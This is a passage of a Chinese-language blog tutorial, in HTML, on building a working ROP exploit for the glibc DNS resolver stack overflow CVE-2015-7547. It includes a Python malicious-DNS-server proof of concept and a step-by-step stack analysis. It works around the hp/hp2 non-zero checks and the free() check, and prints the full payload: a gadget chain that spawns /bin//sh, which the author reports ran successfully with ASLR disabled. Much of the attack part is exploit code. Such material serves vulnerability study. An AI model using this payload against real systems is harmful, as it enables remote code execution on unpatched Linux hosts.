class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e706de</span>)   # xor eax eax ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a020</span>)   # @ .<span class="keyword">data</span> + 8</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x90909090</span>)   # </span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e60514</span>)   # mov [ecx] eax ; or eax -0x1 ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a020</span>)   # @ .<span class="keyword">data</span> + 8</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a020</span>)   # @ .<span class="keyword">data</span> + 8</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e4d646</span>)   # pop ebx ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a018</span>)   # @ .<span class="keyword">data</span></span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e706de</span>)   # xor eax eax ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7f65c56</span>)   # add eax 0xb ;;</span></div><div class="line">      <span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7fdca70</span>)   # int 0x80 ;;</span></div><div class="line">      </div><div class="line">      data2_reply = dw(len(<span class="class"><span class="keyword">data</span>)) + <span class="keyword">data</span></span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      data2_reply = <span class="type">None</span></div><div class="line"></div><div class="line">    reply_now.set()</div><div class="line">    time.sleep(<span class="number">0.01</span>)</div><div class="line">    conn.sendall(data1_reply)</div><div class="line">    time.sleep(<span class="number">0.01</span>)</div><div class="line">    <span class="keyword">if</span> data2:</div><div class="line">      conn.sendall(data2_reply)</div><div class="line"></div><div class="line">    reply_now.clear()</div><div class="line"></div><div class="line">  sock_tcp.shutdown(socket.<span class="type">SHUT_RDWR</span>)</div><div class="line">  sock_tcp.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="title">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line"> t = threading.<span class="type">Thread</span>(target=udp_thread)</div><div class="line"> t.daemon = <span class="type">True</span></div><div class="line"> t.start()</div><div class="line"> tcp_thread()</div><div class="line"> terminate = <span class="type">True</span></div></pre></td></tr></table></figure>
<p>此 POC 基于 google 的溢出POC。<br>核心部分，代码 line 151 ~ 194 data的构造。<br> <font color="red">Tips：</font>因为我把 ASLR 关了，此 POC 并不是通用的，不同机器，可能 gadget 的地址不一样。</p>
<p>不过不要紧，本文将一步步带领大家构造 shellcode，加深对 ROP 的理解。</p>
<h1 id="Ⅱ、栈布局"><a href="#Ⅱ、栈布局" class="headerlink" title="Ⅱ、栈布局"></a>Ⅱ、栈布局</h1> <font color="red">Tips：变量在 gdb 调试过程中的位置，和实际运行时的位置是有差别的</font>

<p>此时 core 文件就显得尤为重要，当程序崩溃时，内核把该程序当前内存映射到core文件里。因此 core 文件保存的是程序运行出错时的实际地址。</p>
<h2 id="①-gdb-调试下栈布局"><a href="#①-gdb-调试下栈布局" class="headerlink" title="① gdb 调试下栈布局"></a>① gdb 调试下栈布局</h2><p>根据上篇文章分析，可以绘制出 gdb 调试下栈空间：<br><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3b2alqd3bj30bx07s0su.jpg" alt=""></p>
<h2 id="②-运行过程中，实际栈布局"><a href="#②-运行过程中，实际栈布局" class="headerlink" title="② 运行过程中，实际栈布局"></a>② 运行过程中，实际栈布局</h2><p>变量相对位置固定，只是基址变了，因此可以通过修改源码，打印 stackbuffer 的起始位置，绘制实际栈布局。</p>
<p>stackbuffer 是在 _nss_dns_gethostbyname4_r 函数中分配的<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">host_buffer.<span class="keyword">buf </span>= <span class="keyword">orig_host_buffer </span>= (querybuf *) alloca (<span class="number">2048</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>在此 buffer 分配空间之后，free 之前的任意位置，打印出变量地址。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">printf</span>(<span class="string">"&amp;host_buffer.buf = %p host_buffer.buf = %p \n"</span>,&amp;host_buffer.buf , host_buffer.buf);</div></pre></td></tr></table></figure></p>
<p><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f39wyn3kqij30hm06f0t4.jpg" alt=""><br>分配空间之后，立即打印，以免后续覆盖，影响结果。</p>
<p>运行 poc<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f39x0dgwgjj30hh023aaz.jpg" alt=""><br>buffer 起始地址 0xbfffe1c0，栈布局如下：</p>
<p><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3b2cvqpndj30bz07s3ym.jpg" alt=""></p>
<h1 id="Ⅲ、非零校验"><a href="#Ⅲ、非零校验" class="headerlink" title="Ⅲ、非零校验"></a>Ⅲ、非零校验</h1><p>了解 _nss_dns_gethostbyname4_r 栈结构之后，首先对其进行溢出测试。<br>修改py文件中TCP发送的 data 数据长度。将数据长度设置为 0x800 + 0x6C = 0x86C，将发送的数据修改为 0<br>dw 转换后占两个字节，db 将 int 转为 char 占一个字节<br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3b2godjbtj30au03974l.jpg" alt=""></p>
<p><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f39xlu5c2hj30k3037dha.jpg" alt=""></p>
<p>根据执行结果可知，在__libc_res_nquery的262行，对hp和hp2进行非零校验。<br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f39xv4sosrj30i901ut8x.jpg" alt=""></p>
<p>将 data 换成非溢出长度，打印出此变量地址<br><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3a2o1rmupj30ae03vjrt.jpg" alt=""><br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f39xwf33z9j30kr026q3m.jpg" alt=""></p>
<p>重新编译运行 POC，在 gdb 下调试，查看 hp 和 hp2 的位置。<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f39yflxqmej30j407pjvk.jpg" alt=""><br>因此 hp 和 hp2 分别位于 0xbfffe9ac 和 0xbfffe9a8，hp和hp2分别指向申请的堆空间和栈空间。</p>
<p>因此 gdb 中栈空间布局：<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3b2nfiafbj30bx09fglu.jpg" alt=""></p>
<p>将 hp 和 hp2 覆盖成 0<br><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3b2yu35evj30k60c2q5y.jpg" alt=""></p>
<p>将 hp 和 hp2 换成之前打印出来的值：<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3adu9z86vj30k70butas.jpg" alt=""><br> <font color="red">hp2:0xbfffe1b0，时刻注意 gdb 中调试地址和程序实际地址不一样，编写 shellcode 时，填写实际运行地址</font></p>
<h1 id="Ⅳ、free-指针处理"><a href="#Ⅳ、free-指针处理" class="headerlink" title="Ⅳ、free 指针处理"></a>Ⅳ、free 指针处理</h1><p>淹没到返回地址之前</p>
<p><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3aedzhbl4j30k60cfwgl.jpg" alt=""></p>
<font color="red">在 gdb 中调试 core 文件，此时看到的是运行时的实际地址，所以，EBP：0xbfffea18</font>   

<p><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f3aeg17c9pj30iu0bon40.jpg" alt=""></p>
<p>在 _nss_dns_gethostbyname4_r 中会检测是否在解析的过程中申请了新的堆空间，如果申请了，则会对该空间进行free。</p>
<p>_nss_dns_gethostbyname4_r 函数的最后：<br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f3aehnc8roj30gj08fwg5.jpg" alt=""></p>
<p>即使 hp2（ans2p） 和 hp（host_buf） 通过了非零验证，但 free 时仍然会出错。此时ans2p 修改为 0xbfffe1b0，栈空间地址，不能释放，因此free 出错，此时需修改 ans2p_malloced 为0，让条件判断不成立。<br>通过源码调试 和 gdb 分析，可得出栈布局</p>
<p><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3aetbguv3j30c60cpwev.jpg" alt=""></p>
<p>修改 poc 中 ans2p_malloced 为0<br><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3aewyyvd3j30k30bh0x9.jpg" alt=""></p>
<p>此时 free 没有错误，但是依然断错，说明在 host_buf 到 EBP 之间的一些内部变量不能被覆盖为 0x42424242，在后续执行程序过程中依然会用到。<br>在 gdb 中查看这些变量的值，并填充在 shellcode 对应位置。</p>
<font color="red"> 时刻注意，gdb 中观察到的地址，和程序实际运行地址不一样，gdb调试时，EBP：0xbfffe9c8</font>

<p>不覆盖 host_buf 到 EBP 之间的变量<br><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3af7s7jskj30k20bjdh9.jpg" alt=""></p>
<p>gdb 调试，查看变量值<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3afbx7cugj30jp0d9gnj.jpg" alt=""></p>
<p>同时可以看到，ans2p_malloced 为0，只执行一次 free，因为 host_buffer.buf指向堆空间，可以正常释放，因此不会出错。</p>
<p>经过反复试验，只用覆盖 EBP 之前的三个变量，因此 data 构造为<br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3afhx6l76j30k40c6abh.jpg" alt=""></p>
<p><font color="red"> 一定要注意，EBP 换成 0xbfffef58，而不是在 gdb 中看到的 0xbfffef08，不然会出段错。时刻注意 gdb 中的地址和程序实际运行地址不一样</font><br>转换方法<br>gdb中 &amp;EBP：0xbfffe9cc  EBP：0xbfffef08<br>实际运行 &amp;EBP：0xbfffea1c   ，根据相对位置不变，可得出 EBP = &amp;EBP + (&amp;EBP - EBP) = 0xbfffef58</p>
<h1 id="Ⅴ、构造-shellcode"><a href="#Ⅴ、构造-shellcode" class="headerlink" title="Ⅴ、构造 shellcode"></a>Ⅴ、构造 shellcode</h1><p>构造 shellcode 不是本教程重点，关于如果构造 ROP shellcode，请参考我的博客 <a href="http://huirong.github.io/2016/03/11/ROP-exploit/">ROP exploit 编写</a>。</p>
<p>shellcode 功能：执行 system(“/bin/shell”)<br>gadgets:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pop</span> <span class="built_in">ecx</span><span class="comment">;pop eax;ret</span></div><div class="line">/bin</div><div class="line">@.data</div><div class="line"><span class="keyword">mov</span> [<span class="built_in">eax</span>] <span class="built_in">ecx</span><span class="comment">;ret</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ecx</span><span class="comment">;pop eax;ret</span></div><div class="line">@.data + <span class="number">4</span></div><div class="line"><span class="keyword">mov</span> [<span class="built_in">eax</span>] <span class="built_in">ecx</span><span class="comment">;ret</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span> <span class="built_in">eax</span><span class="comment">;ret</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ecx</span><span class="comment">;ret</span></div><div class="line">@.data + <span class="number">8</span></div><div class="line"><span class="keyword">mov</span> [<span class="built_in">ecx</span>] <span class="built_in">eax</span><span class="comment">;ret</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ecx</span><span class="comment">;pop edx;ret</span></div><div class="line">@.data + <span class="number">8</span></div><div class="line">@.data + <span class="number">8</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ebx</span><span class="comment">;ret</span></div><div class="line">@.data</div><div class="line"><span class="keyword">add</span> <span class="built_in">eax</span> <span class="number">0xb</span><span class="comment">;ret</span></div><div class="line"><span class="keyword">int</span> <span class="number">0x80</span><span class="comment">;ret</span></div></pre></td></tr></table></figure></p>
<p>根据之间的教程，查找对应 gadget 的实际地址。由于关闭了 ASLR，不同机器，实际地址可能不一样，我建议大家自己查找，也可加强 ROP shellcode 理解。<br>构造好的 data<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">data</span> = ''</span></div><div class="line"><span class="class"><span class="keyword">data</span> += dw(<span class="title">id2</span>)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += '<span class="type">B'</span> * (2106)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += dw(0)                           # &amp;ans2p_malloced</span></div><div class="line"><span class="class"><span class="keyword">data</span> += dw(0)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += '<span class="type">B'</span> * (8)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffe1b0</span>)    #ans2p</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">x0804c3a8</span>)    #host_buffer.buf</span></div><div class="line"><span class="class"><span class="keyword">data</span> += '<span class="type">B'</span> * (12)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xb7fd3000</span>)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xb7e23301</span>)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">x00000420</span>)</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xbfffef58</span>)   # ebp</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>',0<span class="title">xb7f183e0</span>)    #pop ecx;pop eax;ret</span></div><div class="line"><span class="class"><span class="keyword">data</span> += '/bin'</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a018</span>)   # @ .<span class="keyword">data</span></span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7f183e0</span>)   # pop ecx ; pop eax ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += '//sh'              </span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a01c</span>)   # @ .<span class="keyword">data</span> + 4</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5f37f</span>)   # mov [eax] ecx ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e706de</span>)   # xor eax eax ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a020</span>)   # @ .<span class="keyword">data</span> + 8</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x90909090</span>)   # </span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e60514</span>)   # mov [ecx] eax ; or eax -0x1 ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e5fadb</span>)   # pop ecx ; pop edx ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a020</span>)   # @ .<span class="keyword">data</span> + 8</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a020</span>)   # @ .<span class="keyword">data</span> + 8</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e4d646</span>)   # pop ebx ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">x0804a018</span>)   # @ .<span class="keyword">data</span></span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7e706de</span>)   # xor eax eax ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7f65c56</span>)   # add eax 0xb ;;</span></div><div class="line"><span class="class"><span class="keyword">data</span> += struct.pack('&lt;<span class="type">I</span>', 0<span class="title">xb7fdca70</span>)   # int 0x80 ;;</span></div></pre></td></tr></table></figure></p>
<p><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3ag18pvkej30k80cgjtd.jpg" alt=""><br>即使构造好了 shellcode 依然会出断错。</p>
<h1 id="Ⅵ、调整-parameter"><a href="#Ⅵ、调整-parameter" class="headerlink" title="Ⅵ、调整 parameter"></a>Ⅵ、调整 parameter</h1><h2 id="①-查看参数地址"><a href="#①-查看参数地址" class="headerlink" title="① 查看参数地址"></a>① 查看参数地址</h2><p>稍安勿躁，继续使用 gdb 调试，编写实际shellcode的过程本身就很繁琐，大家要有耐心。<br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3ag51ewr1j30lk067jub.jpg" alt=""></p>
<p>在调用 gaih_getanswer 时，不能访问参数指向的内存区。<br>细心的读者，可能发现了，0x6269622f 即 /bin，说明我们的 shellcode 覆盖了 gaih_getanswer 使用的参数。</p>
<p><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f3age6gv2yj30ka05qgns.jpg" alt=""></p>
<p>在程序出错之前，打印参数的地址</p>
<p><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3ages1p9sj30kt0eq43z.jpg" alt=""></p>
<h2 id="②-绘制整体栈布局"><a href="#②-绘制整体栈布局" class="headerlink" title="② 绘制整体栈布局"></a>② 绘制整体栈布局</h2><p>根据上述所有的分析，可得出栈布局</p>
<h3 id="1-gdb-中栈布局"><a href="#1-gdb-中栈布局" class="headerlink" title="(1) gdb 中栈布局"></a>(1) gdb 中栈布局</h3><p><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3agh9snsxj30c60g70td.jpg" alt=""></p>
<h3 id="2-实际运行时-栈布局"><a href="#2-实际运行时-栈布局" class="headerlink" title="(2)实际运行时 栈布局"></a>(2)实际运行时 栈布局</h3><p><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f3b3jk046bj30c70g7q3k.jpg" alt=""></p>
<h1 id="Ⅶ、调整返回地址"><a href="#Ⅶ、调整返回地址" class="headerlink" title="Ⅶ、调整返回地址"></a>Ⅶ、调整返回地址</h1><p>因为返回地址后面有七个参数，返回地址处要调整为 add esp 0x1c;ret<br>这样第一条 gadget 返回之后，esp 增大 28，忽略了这七个参数，跳转到第二条gadget pop ecx;pop eax;ret 出执行，然后执行完整个 shellcode</p>
<p>shellcode 在本教程第一部分，大家可以返回查看。</p>
<p>运行 client</p>
<p><img src="https://ww3.sinaimg.cn/large/005CA6ZCgw1f3agojiur4j30f502o754.jpg" alt=""></p>
<p>OK！！！ shellcode成功运行，真是功夫不负有心人！！！！</p>
<h1 id="Ⅷ、参考文献"><a href="#Ⅷ、参考文献" class="headerlink" title="Ⅷ、参考文献"></a>Ⅷ、参考文献</h1><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="external">Proof of concept for CVE-2015-7547</a><br><a href="http://blog.nsfocus.net/cve-2015-7547-vulnerability-analysis/" target="_blank" rel="external">CVE-2015-7547的漏洞分析</a></p>

    
  </div>
</article>

</div>


  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
        <ul class="theme.donation.items.length">
        
          <li class="item">
            <img src="/images/qr-wechat.png" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>




  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/category/"
              target="_self"
              >
              分类
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              target="_self"
              >
              关于
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/search/"
              target="_self"
              >
              搜索
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    
  <section class="duoshuo-comments">
    <!-- 多说评论框 start -->
    <div class="ds-thread" data-thread-key="https://huirong.github.io/2016/04/25/Linux-glibc-stackOverflow-CVE-2015-7547/index.html" data-title="Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) shellcode 编写" data-url="https://huirong.github.io/2016/04/25/Linux-glibc-stackOverflow-CVE-2015-7547/index.html"></div>
    <!-- 多说评论框 end -->
  </section>




  <script type="text/javascript">
  var duoshuoQuery = {short_name:"huirong"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>


  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
